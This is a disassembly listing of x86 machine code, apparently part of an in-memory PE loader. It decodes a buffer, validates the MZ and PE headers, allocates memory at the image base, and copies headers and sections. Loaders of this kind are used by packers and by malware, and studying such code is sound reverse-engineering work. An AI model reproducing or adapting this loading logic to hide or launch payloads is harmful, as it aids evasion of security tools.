  402749:	51                   	push   %ecx
  40274a:	8d 86 e0 04 00 00    	lea    0x4e0(%esi),%eax
  402750:	50                   	push   %eax
  402751:	ff b6 cc 00 00 00    	push   0xcc(%esi)
  402757:	51                   	push   %ecx
  402758:	ff d2                	call   *%edx
  40275a:	83 f8 20             	cmp    $0x20,%eax
  40275d:	0f 8f 72 13 00 00    	jg     0x403ad5
  402763:	8d 8e c8 00 00 00    	lea    0xc8(%esi),%ecx
  402769:	e8 8f 1b 00 00       	call   0x4042fd
  40276e:	8d 8e d4 00 00 00    	lea    0xd4(%esi),%ecx
  402774:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  40277b:	00 00 00 
  40277e:	e8 7a 1b 00 00       	call   0x4042fd
  402783:	e9 97 f5 ff ff       	jmp    0x401d1f
  402788:	6a 0f                	push   $0xf
  40278a:	68 27 d9 42 00       	push   $0x42d927
  40278f:	e8 6c e8 ff ff       	call   0x401000
  402794:	83 c4 08             	add    $0x8,%esp
  402797:	eb 60                	jmp    0x4027f9
  402799:	6a 0f                	push   $0xf
  40279b:	68 18 d9 42 00       	push   $0x42d918
  4027a0:	e8 5b e8 ff ff       	call   0x401000
  4027a5:	83 c4 08             	add    $0x8,%esp
  4027a8:	eb 4f                	jmp    0x4027f9
  4027aa:	8b 56 34             	mov    0x34(%esi),%edx
  4027ad:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%edx)
  4027b2:	75 36                	jne    0x4027ea
  4027b4:	0f b7 42 3e          	movzwl 0x3e(%edx),%eax
  4027b8:	0f b7 4a 3c          	movzwl 0x3c(%edx),%ecx
  4027bc:	89 46 5c             	mov    %eax,0x5c(%esi)
  4027bf:	0f b7 c0             	movzwl %ax,%eax
  4027c2:	c1 e0 10             	shl    $0x10,%eax
  4027c5:	8d 1c 08             	lea    (%eax,%ecx,1),%ebx
  4027c8:	89 46 4c             	mov    %eax,0x4c(%esi)
  4027cb:	8d 83 10 01 00 00    	lea    0x110(%ebx),%eax
  4027d1:	39 f8                	cmp    %edi,%eax
  4027d3:	0f 86 c9 00 00 00    	jbe    0x4028a2
  4027d9:	6a 0a                	push   $0xa
  4027db:	68 f6 d8 42 00       	push   $0x42d8f6
  4027e0:	e8 1b e8 ff ff       	call   0x401000
  4027e5:	83 c4 08             	add    $0x8,%esp
  4027e8:	eb 0f                	jmp    0x4027f9
  4027ea:	6a 0c                	push   $0xc
  4027ec:	68 00 d9 42 00       	push   $0x42d900
  4027f1:	e8 0a e8 ff ff       	call   0x401000
  4027f6:	83 c4 08             	add    $0x8,%esp
  4027f9:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  402800:	8b 46 08             	mov    0x8(%esi),%eax
  402803:	89 86 a4 00 00 00    	mov    %eax,0xa4(%esi)
  402809:	6a 0f                	push   $0xf
  40280b:	68 bb d9 42 00       	push   $0x42d9bb
  402810:	e8 eb e7 ff ff       	call   0x401000
  402815:	83 c4 08             	add    $0x8,%esp
  402818:	83 7e 08 00          	cmpl   $0x0,0x8(%esi)
  40281c:	b9 c5 41 00 00       	mov    $0x41c5,%ecx
  402821:	0f 85 d4 f2 ff ff    	jne    0x401afb
  402827:	8b 7e 68             	mov    0x68(%esi),%edi
  40282a:	85 ff                	test   %edi,%edi
  40282c:	74 26                	je     0x402854
  40282e:	31 c9                	xor    %ecx,%ecx
  402830:	8b 56 68             	mov    0x68(%esi),%edx
  402833:	39 d1                	cmp    %edx,%ecx
  402835:	0f 83 24 0e 00 00    	jae    0x40365f
  40283b:	8b 56 64             	mov    0x64(%esi),%edx
  40283e:	31 c0                	xor    %eax,%eax
  402840:	8a 1c 0a             	mov    (%edx,%ecx,1),%bl
  402843:	28 d8                	sub    %bl,%al
  402845:	0f b6 c0             	movzbl %al,%eax
  402848:	01 c8                	add    %ecx,%eax
  40284a:	fe c8                	dec    %al
  40284c:	88 04 0a             	mov    %al,(%edx,%ecx,1)
  40284f:	41                   	inc    %ecx
  402850:	39 cf                	cmp    %ecx,%edi
  402852:	75 dc                	jne    0x402830
  402854:	31 c0                	xor    %eax,%eax
  402856:	89 46 68             	mov    %eax,0x68(%esi)
  402859:	89 86 48 09 00 00    	mov    %eax,0x948(%esi)
  40285f:	39 46 60             	cmp    %eax,0x60(%esi)
  402862:	74 1e                	je     0x402882
  402864:	31 c0                	xor    %eax,%eax
  402866:	40                   	inc    %eax
  402867:	50                   	push   %eax
  402868:	50                   	push   %eax
  402869:	6a 00                	push   $0x0
  40286b:	8d 46 60             	lea    0x60(%esi),%eax
  40286e:	50                   	push   %eax
  40286f:	e8 53 22 00 00       	call   0x404ac7
  402874:	83 c4 10             	add    $0x10,%esp
  402877:	3d 01 00 00 80       	cmp    $0x80000001,%eax
  40287c:	0f 85 76 0d 00 00    	jne    0x4035f8
  402882:	6a 0f                	push   $0xf
  402884:	68 ca d9 42 00       	push   $0x42d9ca
  402889:	e8 72 e7 ff ff       	call   0x401000
  40288e:	b9 b4 42 00 00       	mov    $0x42b4,%ecx
  402893:	83 c4 08             	add    $0x8,%esp
  402896:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  40289d:	e9 59 f2 ff ff       	jmp    0x401afb
  4028a2:	39 fb                	cmp    %edi,%ebx
  4028a4:	0f 83 82 12 00 00    	jae    0x403b2c
  4028aa:	8d 43 01             	lea    0x1(%ebx),%eax
  4028ad:	39 f8                	cmp    %edi,%eax
  4028af:	0f 83 39 12 00 00    	jae    0x403aee
  4028b5:	8d 43 02             	lea    0x2(%ebx),%eax
  4028b8:	89 4e 24             	mov    %ecx,0x24(%esi)
  4028bb:	39 f8                	cmp    %edi,%eax
  4028bd:	0f 83 3f 12 00 00    	jae    0x403b02
  4028c3:	8d 4b 03             	lea    0x3(%ebx),%ecx
  4028c6:	39 f9                	cmp    %edi,%ecx
  4028c8:	0f 83 48 12 00 00    	jae    0x403b16
  4028ce:	0f b6 3c 1a          	movzbl (%edx,%ebx,1),%edi
  4028d2:	89 9e 8c 00 00 00    	mov    %ebx,0x8c(%esi)
  4028d8:	89 7e 08             	mov    %edi,0x8(%esi)
  4028db:	89 d7                	mov    %edx,%edi
  4028dd:	0f b6 54 1a 01       	movzbl 0x1(%edx,%ebx,1),%edx
  4028e2:	0f b6 04 07          	movzbl (%edi,%eax,1),%eax
  4028e6:	0f b6 0c 0f          	movzbl (%edi,%ecx,1),%ecx
  4028ea:	c1 e2 08             	shl    $0x8,%edx
  4028ed:	03 56 08             	add    0x8(%esi),%edx
  4028f0:	c1 e0 10             	shl    $0x10,%eax
  4028f3:	c1 e1 18             	shl    $0x18,%ecx
  4028f6:	09 c2                	or     %eax,%edx
  4028f8:	09 ca                	or     %ecx,%edx
  4028fa:	81 fa 50 45 00 00    	cmp    $0x4550,%edx
  402900:	0f 85 88 02 00 00    	jne    0x402b8e
  402906:	8b 9e 8c 00 00 00    	mov    0x8c(%esi),%ebx
  40290c:	8b 7e 18             	mov    0x18(%esi),%edi
  40290f:	8d 43 06             	lea    0x6(%ebx),%eax
  402912:	39 f8                	cmp    %edi,%eax
  402914:	0f 83 26 12 00 00    	jae    0x403b40
  40291a:	8b 56 34             	mov    0x34(%esi),%edx
  40291d:	8d 43 07             	lea    0x7(%ebx),%eax
  402920:	39 f8                	cmp    %edi,%eax
  402922:	0f 83 2c 12 00 00    	jae    0x403b54
  402928:	8d 43 14             	lea    0x14(%ebx),%eax
  40292b:	39 f8                	cmp    %edi,%eax
  40292d:	0f 83 35 12 00 00    	jae    0x403b68
  402933:	8d 43 15             	lea    0x15(%ebx),%eax
  402936:	39 f8                	cmp    %edi,%eax
  402938:	0f 83 3e 12 00 00    	jae    0x403b7c
  40293e:	8d 4b 18             	lea    0x18(%ebx),%ecx
  402941:	39 f9                	cmp    %edi,%ecx
  402943:	89 4e 0c             	mov    %ecx,0xc(%esi)
  402946:	0f 83 44 12 00 00    	jae    0x403b90
  40294c:	8d 43 19             	lea    0x19(%ebx),%eax
  40294f:	39 f8                	cmp    %edi,%eax
  402951:	0f 83 4f 12 00 00    	jae    0x403ba6
  402957:	0f b6 4c 1a 06       	movzbl 0x6(%edx,%ebx,1),%ecx
  40295c:	0f b6 04 02          	movzbl (%edx,%eax,1),%eax
  402960:	89 8e 98 00 00 00    	mov    %ecx,0x98(%esi)
  402966:	0f b6 4c 1a 07       	movzbl 0x7(%edx,%ebx,1),%ecx
  40296b:	c1 e0 08             	shl    $0x8,%eax
  40296e:	89 8e 9c 00 00 00    	mov    %ecx,0x9c(%esi)
  402974:	8b 4e 0c             	mov    0xc(%esi),%ecx
  402977:	0f b6 0c 0a          	movzbl (%edx,%ecx,1),%ecx
  40297b:	09 c8                	or     %ecx,%eax
  40297d:	8a 4c 1a 14          	mov    0x14(%edx,%ebx,1),%cl
  402981:	8a 54 1a 15          	mov    0x15(%edx,%ebx,1),%dl
  402985:	3d 0b 01 00 00       	cmp    $0x10b,%eax
  40298a:	0f 84 12 02 00 00    	je     0x402ba2
  402990:	3d 0b 02 00 00       	cmp    $0x20b,%eax
  402995:	0f 85 f0 0a 00 00    	jne    0x40348b
  40299b:	8d 43 50             	lea    0x50(%ebx),%eax
  40299e:	39 f8                	cmp    %edi,%eax
  4029a0:	0f 83 7a 12 00 00    	jae    0x403c20
  4029a6:	8d 43 51             	lea    0x51(%ebx),%eax
  4029a9:	39 f8                	cmp    %edi,%eax
  4029ab:	0f 83 09 12 00 00    	jae    0x403bba
  4029b1:	8d 43 52             	lea    0x52(%ebx),%eax
  4029b4:	39 f8                	cmp    %edi,%eax
  4029b6:	0f 83 b4 12 00 00    	jae    0x403c70
  4029bc:	8d 43 53             	lea    0x53(%ebx),%eax
  4029bf:	39 f8                	cmp    %edi,%eax
  4029c1:	0f 83 fd 12 00 00    	jae    0x403cc4
  4029c7:	8d 43 54             	lea    0x54(%ebx),%eax
  4029ca:	39 f8                	cmp    %edi,%eax
  4029cc:	0f 83 06 13 00 00    	jae    0x403cd8
  4029d2:	8d 43 55             	lea    0x55(%ebx),%eax
  4029d5:	39 f8                	cmp    %edi,%eax
  4029d7:	0f 83 4b 13 00 00    	jae    0x403d28
  4029dd:	8d 43 56             	lea    0x56(%ebx),%eax
  4029e0:	39 f8                	cmp    %edi,%eax
  4029e2:	0f 83 54 13 00 00    	jae    0x403d3c
  4029e8:	8d 43 57             	lea    0x57(%ebx),%eax
  4029eb:	39 f8                	cmp    %edi,%eax
  4029ed:	0f 83 99 13 00 00    	jae    0x403d8c
  4029f3:	8d 43 30             	lea    0x30(%ebx),%eax
  4029f6:	39 f8                	cmp    %edi,%eax
  4029f8:	0f 83 f2 13 00 00    	jae    0x403df0
  4029fe:	8d 43 31             	lea    0x31(%ebx),%eax
  402a01:	39 f8                	cmp    %edi,%eax
  402a03:	0f 83 25 14 00 00    	jae    0x403e2e
  402a09:	8d 43 32             	lea    0x32(%ebx),%eax
  402a0c:	39 f8                	cmp    %edi,%eax
  402a0e:	0f 83 46 14 00 00    	jae    0x403e5a
  402a14:	8d 43 33             	lea    0x33(%ebx),%eax
  402a17:	39 f8                	cmp    %edi,%eax
  402a19:	0f 83 63 14 00 00    	jae    0x403e82
  402a1f:	8d 43 34             	lea    0x34(%ebx),%eax
  402a22:	39 f8                	cmp    %edi,%eax
  402a24:	0f 83 94 14 00 00    	jae    0x403ebe
  402a2a:	8d 43 35             	lea    0x35(%ebx),%eax
  402a2d:	39 f8                	cmp    %edi,%eax
  402a2f:	0f 83 c5 14 00 00    	jae    0x403efa
  402a35:	8d 43 36             	lea    0x36(%ebx),%eax
  402a38:	39 f8                	cmp    %edi,%eax
  402a3a:	0f 83 f4 11 00 00    	jae    0x403c34
  402a40:	8d 43 37             	lea    0x37(%ebx),%eax
  402a43:	39 f8                	cmp    %edi,%eax
  402a45:	0f 83 83 11 00 00    	jae    0x403bce
  402a4b:	8d 83 90 00 00 00    	lea    0x90(%ebx),%eax
  402a51:	39 f8                	cmp    %edi,%eax
  402a53:	0f 83 2b 12 00 00    	jae    0x403c84
  402a59:	8d 83 91 00 00 00    	lea    0x91(%ebx),%eax
  402a5f:	39 f8                	cmp    %edi,%eax
  402a61:	0f 83 85 12 00 00    	jae    0x403cec
  402a67:	8d 83 92 00 00 00    	lea    0x92(%ebx),%eax
  402a6d:	39 f8                	cmp    %edi,%eax
  402a6f:	0f 83 8b 12 00 00    	jae    0x403d00
  402a75:	8d 83 93 00 00 00    	lea    0x93(%ebx),%eax
  402a7b:	39 f8                	cmp    %edi,%eax
  402a7d:	0f 83 cd 12 00 00    	jae    0x403d50
  402a83:	8d 83 b0 00 00 00    	lea    0xb0(%ebx),%eax
  402a89:	39 f8                	cmp    %edi,%eax
  402a8b:	0f 83 0f 13 00 00    	jae    0x403da0
  402a91:	8d 83 b1 00 00 00    	lea    0xb1(%ebx),%eax
  402a97:	88 56 54             	mov    %dl,0x54(%esi)
  402a9a:	88 4e 58             	mov    %cl,0x58(%esi)
  402a9d:	39 f8                	cmp    %edi,%eax
  402a9f:	0f 83 0f 13 00 00    	jae    0x403db4
  402aa5:	8d 93 b2 00 00 00    	lea    0xb2(%ebx),%edx
  402aab:	39 fa                	cmp    %edi,%edx
  402aad:	89 56 08             	mov    %edx,0x8(%esi)
  402ab0:	0f 83 4e 13 00 00    	jae    0x403e04
  402ab6:	8d 8b b3 00 00 00    	lea    0xb3(%ebx),%ecx
  402abc:	89 46 2c             	mov    %eax,0x2c(%esi)
  402abf:	39 f9                	cmp    %edi,%ecx
  402ac1:	89 4e 14             	mov    %ecx,0x14(%esi)
  402ac4:	0f 83 78 13 00 00    	jae    0x403e42
  402aca:	8b 4e 34             	mov    0x34(%esi),%ecx
  402acd:	0f b6 44 19 50       	movzbl 0x50(%ecx,%ebx,1),%eax
  402ad2:	0f b6 54 19 52       	movzbl 0x52(%ecx,%ebx,1),%edx
  402ad7:	0f b6 7c 19 53       	movzbl 0x53(%ecx,%ebx,1),%edi
  402adc:	89 46 44             	mov    %eax,0x44(%esi)
  402adf:	0f b6 44 19 51       	movzbl 0x51(%ecx,%ebx,1),%eax
  402ae4:	c1 e2 10             	shl    $0x10,%edx
  402ae7:	c1 e7 18             	shl    $0x18,%edi
  402aea:	c1 e0 08             	shl    $0x8,%eax
  402aed:	03 46 44             	add    0x44(%esi),%eax
  402af0:	09 d0                	or     %edx,%eax
  402af2:	0f b6 54 19 55       	movzbl 0x55(%ecx,%ebx,1),%edx
  402af7:	09 f8                	or     %edi,%eax
  402af9:	0f b6 7c 19 56       	movzbl 0x56(%ecx,%ebx,1),%edi
  402afe:	89 46 48             	mov    %eax,0x48(%esi)
  402b01:	0f b6 44 19 54       	movzbl 0x54(%ecx,%ebx,1),%eax
  402b06:	c1 e2 08             	shl    $0x8,%edx
  402b09:	c1 e7 10             	shl    $0x10,%edi
  402b0c:	09 c2                	or     %eax,%edx
  402b0e:	0f b6 44 19 57       	movzbl 0x57(%ecx,%ebx,1),%eax
  402b13:	09 fa                	or     %edi,%edx
  402b15:	0f b6 7c 19 30       	movzbl 0x30(%ecx,%ebx,1),%edi
  402b1a:	c1 e0 18             	shl    $0x18,%eax
  402b1d:	09 c2                	or     %eax,%edx
  402b1f:	0f b6 44 19 32       	movzbl 0x32(%ecx,%ebx,1),%eax
  402b24:	89 56 50             	mov    %edx,0x50(%esi)
  402b27:	0f b6 54 19 31       	movzbl 0x31(%ecx,%ebx,1),%edx
  402b2c:	c1 e0 10             	shl    $0x10,%eax
  402b2f:	c1 e2 08             	shl    $0x8,%edx
  402b32:	09 fa                	or     %edi,%edx
  402b34:	0f b6 bc 19 91 00 00 	movzbl 0x91(%ecx,%ebx,1),%edi
  402b3b:	00 
  402b3c:	09 c2                	or     %eax,%edx
  402b3e:	0f b6 44 19 33       	movzbl 0x33(%ecx,%ebx,1),%eax
  402b43:	c1 e7 08             	shl    $0x8,%edi
  402b46:	c1 e0 18             	shl    $0x18,%eax
  402b49:	09 c2                	or     %eax,%edx
  402b4b:	0f b6 84 19 90 00 00 	movzbl 0x90(%ecx,%ebx,1),%eax
  402b52:	00 
  402b53:	89 56 70             	mov    %edx,0x70(%esi)
  402b56:	09 c7                	or     %eax,%edi
  402b58:	0f b6 84 19 92 00 00 	movzbl 0x92(%ecx,%ebx,1),%eax
  402b5f:	00 
  402b60:	c1 e0 10             	shl    $0x10,%eax
  402b63:	09 c7                	or     %eax,%edi
  402b65:	0f b6 84 19 93 00 00 	movzbl 0x93(%ecx,%ebx,1),%eax
  402b6c:	00 
  402b6d:	c1 e0 18             	shl    $0x18,%eax
  402b70:	09 c7                	or     %eax,%edi
  402b72:	8a 84 19 b0 00 00 00 	mov    0xb0(%ecx,%ebx,1),%al
  402b79:	89 7e 74             	mov    %edi,0x74(%esi)
  402b7c:	bf bc d4 42 00       	mov    $0x42d4bc,%edi
  402b81:	88 46 33             	mov    %al,0x33(%esi)
  402b84:	b0 01                	mov    $0x1,%al
  402b86:	89 46 44             	mov    %eax,0x44(%esi)
  402b89:	e9 d8 01 00 00       	jmp    0x402d66
  402b8e:	6a 0c                	push   $0xc
  402b90:	68 ea d8 42 00       	push   $0x42d8ea
  402b95:	e8 66 e4 ff ff       	call   0x401000
  402b9a:	83 c4 08             	add    $0x8,%esp
  402b9d:	e9 57 fc ff ff       	jmp    0x4027f9
  402ba2:	8d 43 50             	lea    0x50(%ebx),%eax
  402ba5:	39 f8                	cmp    %edi,%eax
  402ba7:	0f 83 e9 12 00 00    	jae    0x403e96
  402bad:	8d 43 51             	lea    0x51(%ebx),%eax
  402bb0:	39 f8                	cmp    %edi,%eax
  402bb2:	0f 83 1a 13 00 00    	jae    0x403ed2
  402bb8:	8d 43 52             	lea    0x52(%ebx),%eax
  402bbb:	39 f8                	cmp    %edi,%eax
  402bbd:	0f 83 4b 13 00 00    	jae    0x403f0e
  402bc3:	8d 43 53             	lea    0x53(%ebx),%eax
  402bc6:	39 f8                	cmp    %edi,%eax
  402bc8:	0f 83 7a 10 00 00    	jae    0x403c48
  402bce:	8d 43 54             	lea    0x54(%ebx),%eax
  402bd1:	39 f8                	cmp    %edi,%eax
  402bd3:	0f 83 09 10 00 00    	jae    0x403be2
  402bd9:	8d 43 55             	lea    0x55(%ebx),%eax
  402bdc:	39 f8                	cmp    %edi,%eax
  402bde:	0f 83 28 10 00 00    	jae    0x403c0c
  402be4:	8d 43 56             	lea    0x56(%ebx),%eax
  402be7:	39 f8                	cmp    %edi,%eax
  402be9:	0f 83 c1 10 00 00    	jae    0x403cb0
  402bef:	8d 43 57             	lea    0x57(%ebx),%eax
  402bf2:	39 f8                	cmp    %edi,%eax
  402bf4:	0f 83 1a 11 00 00    	jae    0x403d14
  402bfa:	8d 43 34             	lea    0x34(%ebx),%eax
  402bfd:	39 f8                	cmp    %edi,%eax
  402bff:	0f 83 5f 11 00 00    	jae    0x403d64
  402c05:	8d 43 35             	lea    0x35(%ebx),%eax
  402c08:	39 f8                	cmp    %edi,%eax
  402c0a:	0f 83 68 11 00 00    	jae    0x403d78
  402c10:	8d 43 36             	lea    0x36(%ebx),%eax
  402c13:	39 f8                	cmp    %edi,%eax
  402c15:	0f 83 ad 11 00 00    	jae    0x403dc8
  402c1b:	8d 43 37             	lea    0x37(%ebx),%eax
  402c1e:	39 f8                	cmp    %edi,%eax
  402c20:	0f 83 b6 11 00 00    	jae    0x403ddc
  402c26:	8d 83 80 00 00 00    	lea    0x80(%ebx),%eax
  402c2c:	39 f8                	cmp    %edi,%eax
  402c2e:	0f 83 e6 11 00 00    	jae    0x403e1a
  402c34:	8d 83 81 00 00 00    	lea    0x81(%ebx),%eax
  402c3a:	39 f8                	cmp    %edi,%eax
  402c3c:	0f 83 2c 12 00 00    	jae    0x403e6e
  402c42:	8d 83 82 00 00 00    	lea    0x82(%ebx),%eax
  402c48:	39 f8                	cmp    %edi,%eax
  402c4a:	0f 83 5a 12 00 00    	jae    0x403eaa
  402c50:	8d 83 83 00 00 00    	lea    0x83(%ebx),%eax
  402c56:	39 f8                	cmp    %edi,%eax
  402c58:	0f 83 88 12 00 00    	jae    0x403ee6
  402c5e:	8d 83 a0 00 00 00    	lea    0xa0(%ebx),%eax
  402c64:	39 f8                	cmp    %edi,%eax
  402c66:	0f 83 b6 12 00 00    	jae    0x403f22
  402c6c:	8d 83 a1 00 00 00    	lea    0xa1(%ebx),%eax
  402c72:	88 56 54             	mov    %dl,0x54(%esi)
  402c75:	88 4e 58             	mov    %cl,0x58(%esi)
  402c78:	39 f8                	cmp    %edi,%eax
  402c7a:	0f 83 dc 0f 00 00    	jae    0x403c5c
  402c80:	8d 93 a2 00 00 00    	lea    0xa2(%ebx),%edx
  402c86:	39 fa                	cmp    %edi,%edx
  402c88:	89 56 08             	mov    %edx,0x8(%esi)
  402c8b:	0f 83 65 0f 00 00    	jae    0x403bf6
  402c91:	8d 8b a3 00 00 00    	lea    0xa3(%ebx),%ecx
  402c97:	89 46 2c             	mov    %eax,0x2c(%esi)
  402c9a:	39 f9                	cmp    %edi,%ecx
  402c9c:	89 4e 14             	mov    %ecx,0x14(%esi)
  402c9f:	0f 83 f3 0f 00 00    	jae    0x403c98
  402ca5:	8b 4e 34             	mov    0x34(%esi),%ecx
  402ca8:	0f b6 44 19 50       	movzbl 0x50(%ecx,%ebx,1),%eax
  402cad:	0f b6 54 19 52       	movzbl 0x52(%ecx,%ebx,1),%edx
  402cb2:	0f b6 7c 19 53       	movzbl 0x53(%ecx,%ebx,1),%edi
  402cb7:	89 46 44             	mov    %eax,0x44(%esi)
  402cba:	0f b6 44 19 51       	movzbl 0x51(%ecx,%ebx,1),%eax
  402cbf:	c1 e2 10             	shl    $0x10,%edx
  402cc2:	c1 e7 18             	shl    $0x18,%edi
  402cc5:	c1 e0 08             	shl    $0x8,%eax
  402cc8:	03 46 44             	add    0x44(%esi),%eax
  402ccb:	c7 46 44 00 00 00 00 	movl   $0x0,0x44(%esi)
  402cd2:	09 d0                	or     %edx,%eax
  402cd4:	0f b6 54 19 55       	movzbl 0x55(%ecx,%ebx,1),%edx
  402cd9:	09 f8                	or     %edi,%eax
  402cdb:	0f b6 7c 19 56       	movzbl 0x56(%ecx,%ebx,1),%edi
  402ce0:	89 46 48             	mov    %eax,0x48(%esi)
  402ce3:	0f b6 44 19 54       	movzbl 0x54(%ecx,%ebx,1),%eax
  402ce8:	c1 e2 08             	shl    $0x8,%edx
  402ceb:	c1 e7 10             	shl    $0x10,%edi
  402cee:	09 c2                	or     %eax,%edx
  402cf0:	0f b6 44 19 57       	movzbl 0x57(%ecx,%ebx,1),%eax
  402cf5:	09 fa                	or     %edi,%edx
  402cf7:	0f b6 7c 19 34       	movzbl 0x34(%ecx,%ebx,1),%edi
  402cfc:	c1 e0 18             	shl    $0x18,%eax
  402cff:	09 c2                	or     %eax,%edx
  402d01:	0f b6 44 19 36       	movzbl 0x36(%ecx,%ebx,1),%eax
  402d06:	89 56 50             	mov    %edx,0x50(%esi)
  402d09:	0f b6 54 19 35       	movzbl 0x35(%ecx,%ebx,1),%edx
  402d0e:	c1 e0 10             	shl    $0x10,%eax
  402d11:	c1 e2 08             	shl    $0x8,%edx
  402d14:	09 fa                	or     %edi,%edx
  402d16:	0f b6 bc 19 83 00 00 	movzbl 0x83(%ecx,%ebx,1),%edi
  402d1d:	00 
  402d1e:	09 c2                	or     %eax,%edx
  402d20:	0f b6 44 19 37       	movzbl 0x37(%ecx,%ebx,1),%eax
  402d25:	c1 e7 18             	shl    $0x18,%edi
  402d28:	c1 e0 18             	shl    $0x18,%eax
  402d2b:	09 c2                	or     %eax,%edx
  402d2d:	0f b6 84 19 80 00 00 	movzbl 0x80(%ecx,%ebx,1),%eax
  402d34:	00 
  402d35:	89 56 70             	mov    %edx,0x70(%esi)
  402d38:	0f b6 94 19 81 00 00 	movzbl 0x81(%ecx,%ebx,1),%edx
  402d3f:	00 
  402d40:	c1 e2 08             	shl    $0x8,%edx
  402d43:	09 c2                	or     %eax,%edx
  402d45:	0f b6 84 19 82 00 00 	movzbl 0x82(%ecx,%ebx,1),%eax
  402d4c:	00 
  402d4d:	c1 e0 10             	shl    $0x10,%eax
  402d50:	09 c2                	or     %eax,%edx
  402d52:	09 fa                	or     %edi,%edx
  402d54:	bf 08 d6 42 00       	mov    $0x42d608,%edi
  402d59:	89 56 74             	mov    %edx,0x74(%esi)
  402d5c:	8a 94 19 a0 00 00 00 	mov    0xa0(%ecx,%ebx,1),%dl
  402d63:	88 56 33             	mov    %dl,0x33(%esi)
  402d66:	8b 46 2c             	mov    0x2c(%esi),%eax
  402d69:	0f b6 04 01          	movzbl (%ecx,%eax,1),%eax
  402d6d:	89 86 ac 00 00 00    	mov    %eax,0xac(%esi)
  402d73:	8b 46 08             	mov    0x8(%esi),%eax
  402d76:	0f b6 04 01          	movzbl (%ecx,%eax,1),%eax
  402d7a:	89 86 b0 00 00 00    	mov    %eax,0xb0(%esi)
  402d80:	8b 46 14             	mov    0x14(%esi),%eax
  402d83:	0f b6 04 01          	movzbl (%ecx,%eax,1),%eax
  402d87:	89 46 14             	mov    %eax,0x14(%esi)
  402d8a:	6a 0a                	push   $0xa
  402d8c:	57                   	push   %edi
  402d8d:	e8 6e e2 ff ff       	call   0x401000
  402d92:	83 c4 08             	add    $0x8,%esp
  402d95:	6a 0c                	push   $0xc
  402d97:	68 12 d6 42 00       	push   $0x42d612
  402d9c:	e8 5f e2 ff ff       	call   0x401000
  402da1:	83 c4 08             	add    $0x8,%esp
  402da4:	8b 46 48             	mov    0x48(%esi),%eax
  402da7:	05 c5 7d 00 00       	add    $0x7dc5,%eax
  402dac:	6a 04                	push   $0x4
  402dae:	68 00 30 00 00       	push   $0x3000
  402db3:	89 46 2c             	mov    %eax,0x2c(%esi)
  402db6:	50                   	push   %eax
  402db7:	ff 76 70             	push   0x70(%esi)
  402dba:	ff 56 04             	call   *0x4(%esi)
  402dbd:	89 46 08             	mov    %eax,0x8(%esi)
  402dc0:	6a 10                	push   $0x10
  402dc2:	68 1e d6 42 00       	push   $0x42d61e
  402dc7:	e8 34 e2 ff ff       	call   0x401000
  402dcc:	83 c4 08             	add    $0x8,%esp
  402dcf:	83 7e 08 00          	cmpl   $0x0,0x8(%esi)
  402dd3:	75 29                	jne    0x402dfe
  402dd5:	6a 12                	push   $0x12
  402dd7:	68 2e d6 42 00       	push   $0x42d62e
  402ddc:	e8 1f e2 ff ff       	call   0x401000
  402de1:	83 c4 08             	add    $0x8,%esp
  402de4:	6a 04                	push   $0x4
  402de6:	68 00 30 00 00       	push   $0x3000
  402deb:	ff 76 2c             	push   0x2c(%esi)
  402dee:	6a 00                	push   $0x0
  402df0:	ff 56 04             	call   *0x4(%esi)
  402df3:	85 c0                	test   %eax,%eax
  402df5:	0f 84 71 07 00 00    	je     0x40356c
  402dfb:	89 46 08             	mov    %eax,0x8(%esi)
  402dfe:	6a 0f                	push   $0xf
  402e00:	68 40 d6 42 00       	push   $0x42d640
  402e05:	e8 f6 e1 ff ff       	call   0x401000
  402e0a:	83 c4 08             	add    $0x8,%esp
  402e0d:	8b 86 9c 00 00 00    	mov    0x9c(%esi),%eax
  402e13:	0f b6 56 54          	movzbl 0x54(%esi),%edx
  402e17:	8b 5e 18             	mov    0x18(%esi),%ebx
  402e1a:	8b 7e 08             	mov    0x8(%esi),%edi
  402e1d:	c1 e0 08             	shl    $0x8,%eax
  402e20:	c1 e2 08             	shl    $0x8,%edx
  402e23:	03 86 98 00 00 00    	add    0x98(%esi),%eax
  402e29:	89 56 1c             	mov    %edx,0x1c(%esi)
  402e2c:	89 86 90 00 00 00    	mov    %eax,0x90(%esi)
  402e32:	8b 46 50             	mov    0x50(%esi),%eax
  402e35:	39 c3                	cmp    %eax,%ebx
  402e37:	89 c1                	mov    %eax,%ecx
  402e39:	0f 42 cb             	cmovb  %ebx,%ecx
  402e3c:	85 c0                	test   %eax,%eax
  402e3e:	0f b6 46 58          	movzbl 0x58(%esi),%eax
  402e42:	89 4e 04             	mov    %ecx,0x4(%esi)
  402e45:	89 46 20             	mov    %eax,0x20(%esi)
  402e48:	8d 04 02             	lea    (%edx,%eax,1),%eax
  402e4b:	89 46 50             	mov    %eax,0x50(%esi)
  402e4e:	8b 46 34             	mov    0x34(%esi),%eax
  402e51:	74 0e                	je     0x402e61
  402e53:	31 c9                	xor    %ecx,%ecx
  402e55:	8a 14 08             	mov    (%eax,%ecx,1),%dl
  402e58:	88 14 0f             	mov    %dl,(%edi,%ecx,1)
  402e5b:	41                   	inc    %ecx
  402e5c:	39 4e 04             	cmp    %ecx,0x4(%esi)
  402e5f:	75 f4                	jne    0x402e55
  402e61:	8b 56 50             	mov    0x50(%esi),%edx
  402e64:	03 56 0c             	add    0xc(%esi),%edx
  402e67:	83 be 90 00 00 00 00 	cmpl   $0x0,0x90(%esi)
  402e6e:	89 56 50             	mov    %edx,0x50(%esi)
  402e71:	0f 84 dd 01 00 00    	je     0x403054
  402e77:	31 ff                	xor    %edi,%edi
  402e79:	8d 04 bf             	lea    (%edi,%edi,4),%eax
  402e7c:	8d 4c c2 28          	lea    0x28(%edx,%eax,8),%ecx
  402e80:	39 d9                	cmp    %ebx,%ecx
  402e82:	0f 87 cc 01 00 00    	ja     0x403054
  402e88:	8d 0c c2             	lea    (%edx,%eax,8),%ecx
  402e8b:	8d 41 0c             	lea    0xc(%ecx),%eax
  402e8e:	39 d8                	cmp    %ebx,%eax
  402e90:	0f 83 50 0a 00 00    	jae    0x4038e6
  402e96:	8d 41 0d             	lea    0xd(%ecx),%eax
  402e99:	39 d8                	cmp    %ebx,%eax
  402e9b:	0f 83 cf 0a 00 00    	jae    0x403970
  402ea1:	8d 41 0e             	lea    0xe(%ecx),%eax
  402ea4:	39 d8                	cmp    %ebx,%eax
